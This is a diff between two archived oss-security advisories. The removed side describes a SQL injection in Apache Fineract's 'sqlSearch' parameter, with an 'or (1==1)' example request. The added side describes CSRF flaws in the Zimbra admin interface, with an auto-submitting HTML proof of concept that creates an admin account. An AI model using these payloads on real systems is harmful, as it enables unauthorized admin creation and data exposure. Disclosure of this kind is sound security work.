@@ -1,49 +1,88 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/12/13/1
-Message-ID: <CAOSe2yu-zjb+4Rt0t9tTTwpYAee9qCMenVOsauWJn7=yNQVL=g@mail.gmail.com>
-Date: Wed, 13 Dec 2017 15:04:22 +0530
-From: Nazeer Shaik <nazeer1100126@...che.org>
-To: user@...eract.apache.org, Dev <dev@...eract.apache.org>,  oss-security@...ts.openwall.com, security <security@...che.org>,  aleksandar.ivanov-2@...dent.manchester.ac.uk
-Subject: [SECURITY] CVE-2017-5663: Apache Fineract SQL Injection Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/11/11
+Message-ID: <cf184207-ba87-9bd0-d1f9-d654f4cdc18e@sysdream.com>
+Date: Wed, 11 Jan 2017 15:10:02 +0100
+From: Sysdream Labs <labs@...dream.com>
+To: oss-security@...ts.openwall.com
+Cc: fulldisclosure@...lists.org
+Subject: [CVE-2016-3403] [Zimbra] Multiple CSRF in Administration interface - all versions
 Content-Type: text/plain; charset=utf-8
 
-CVE-2017-5663: Apache Fineract SQL Injection Vulnerability
+# CVE-2016-3403: Multiple CSRF in Zimbra Administration interface
 
-Severity: Critical
+## Description
 
-Vendor:
-The Apache Software Foundation
+Multiple CSRF vulnerabilities have been found in the administration
+interface of Zimbra, giving possibilities like adding, modifying and
+removing admin accounts.
 
-Versions Affected:
-Apache Fineract 0.6.0-incubating
-Apache Fineract 0.5.0-incubating
-Apache Fineract 0.4.0-incubating
+## Vulnerability
 
-Description:
-Apache Fineract exposes different REST end points to query domain specific
-entities with a Query Parameter 'sqlSearch' which
-is appended directly with SQL statements. A hacker/user can inject/draft
-the 'sqlSearch' query parameter in such a way to
-to read/update the data for which he doesn't have authorization.
+Every forms in the Administration part of Zimbra are vulnerable to CSRF
+because of the lack of a CSRF token identifying a valid session. As a
+consequence, requests can be forged and played arbitrarily.
 
-Mitigation:
-All users should migrate to Apache Fineract 1.0.0 version
-https://github.com/apache/fineract/tree/1.0.0
+**Access Vector**:   remote
+**Security Risk**:   low
+**Vulnerability**:   CWE-352
+**CVSS Base score**: 5.8
+
+## Proof of Concept
+
+```html
+<html>
+<body>
+<form enctype="text/plain" id="trololo"
+action="https://192.168.0.171:7071/service/admin/soap/CreateAccountRequest"
+method="POST">
+    <input name='<soap:Envelope
+xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context
+xmlns="urn:zimbra"><userAgent xmlns="" name="DTC"/><session xmlns=""
+id="1337"/><format xmlns=""
+type="js"/></context></soap:Header><soap:Body><CreateAccountRequest
+xmlns="urn:zimbraAdmin"><name xmlns="">itworks@...ntu.fr</name><password
+xmlns="">test1234</password><a xmlns=""
+n="zimbraAccountStatus">active</a><a xmlns=""
+n="displayName">ItWorks</a><a xmlns="" n'
+
+        value='"sn">itworks</a><a xmlns=""
+n="zimbraIsAdminAccount">TRUE</a></CreateAccountRequest></soap:Body></soap:Envelope>'/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
+```
+
+## Solution
+
+  * Upgrade to version 8.7
+
+## Affected versions
+
+ * All versions previous to 8.7
+
+## Fixes
+
+ * https://bugzilla.zimbra.com/show_bug.cgi?id=100885
+ * https://bugzilla.zimbra.com/show_bug.cgi?id=100899
+
+## Timeline (dd/mm/yyyy)
+
+ * 24/02/2016: Issue reported to Zimbra
+ * 24/02/2016: Issue aknwoledged
+ * 20/06/2016: complete fixes released with version 8.7
+
+## Credits
+
+ * Anthony LAOU-HINE TSUEI, Sysdream (laouhine_anthony -at- hotmail
+-dot- fr)
+ * Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)
+ 
+ 
 
 
-Example:
-A request to retrieve the Clients with displayName=Thomas GET
-https://DomainName/api/v1/clients?sqlSearch=displayName='Thomas'
-An attacker/user can use GET https://DomainName/api/v1/clients?sqlSearch=
-or (1==1) to retrieve all clients in the system
 
-Credit:
-This issue was discovered by Alex Ivanov
 
-References:
-http://fineract.apache.org/
-https://cwiki.apache.org/confluence/display/FINERACT/Apache+Fineract+Security+Report
-
-Regards,
-Apache Fineract Team
-
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
